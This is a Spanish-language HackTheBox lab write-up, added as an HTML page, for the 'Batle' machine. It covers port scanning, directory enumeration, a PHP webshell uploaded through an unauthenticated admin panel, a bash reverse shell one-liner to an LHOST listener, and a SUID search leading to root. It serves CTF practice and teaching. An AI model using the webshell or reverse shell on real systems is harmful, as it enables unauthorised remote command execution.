@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Batle | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-warning text-dark fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">Web</span>
+        <span class="badge bg-secondary">nginx</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Batle</h1>
+      <p class="text-secondary mb-3">Aplicación web en nginx con servicios en puertos 80 y 8080. Enumeración de directorios y explotación de funcionalidades expuestas.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-calendar3"></i> Ago 2023</span>
+        <span><i class="bi bi-clock"></i> ~60 min</span>
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">gobuster</span>
+        <span class="badge bg-dark border border-secondary p-2">burp suite</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -p 22,80,8080 -sC -sV -Pn 10.10.110.102</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+8080/tcp open  http    nginx 1.18.0 (Ubuntu)</code></pre>
+      </div>
+      <p class="text-secondary">Dos servicios web en puertos diferentes. Enumeramos directorios en ambos:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>gobuster dir -u http://10.10.110.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://10.10.110.102:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+      </div>
+      <p class="text-secondary">El puerto 8080 expone un panel de administración sin autenticación.</p>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> Explotación</h4>
+      <p class="text-secondary">El panel admin en el puerto 8080 permite subir archivos. Subimos una webshell PHP:</p>
+      <div class="code-block mb-3">
+        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>curl "http://10.10.110.102:8080/uploads/shell.php?cmd=id"
+uid=33(www-data) gid=33(www-data)</code></pre>
+      </div>
+      <p class="text-secondary">Escalamos a shell interactiva con netcat:</p>
+      <div class="code-block mb-3">
+        <pre><code>curl "http://10.10.110.102:8080/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/4444+0>%261'"</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada de privilegios</h4>
+      <p class="text-secondary">Encontramos credenciales en archivos de configuración de la aplicación y las reutilizamos para escalar a un usuario con más privilegios. Verificamos binarios SUID:</p>
+      <div class="code-block mb-3">
+        <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>whoami
+<span class="text-danger fw-bold">root</span></code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary">
+        <li>Siempre escanear todos los puertos — servicios en puertos no estándar pueden estar menos protegidos.</li>
+        <li>Los paneles de admin expuestos sin autenticación son vectores de ataque inmediatos.</li>
+        <li>La subida de archivos sin validación de extensión permite RCE directo via webshell.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
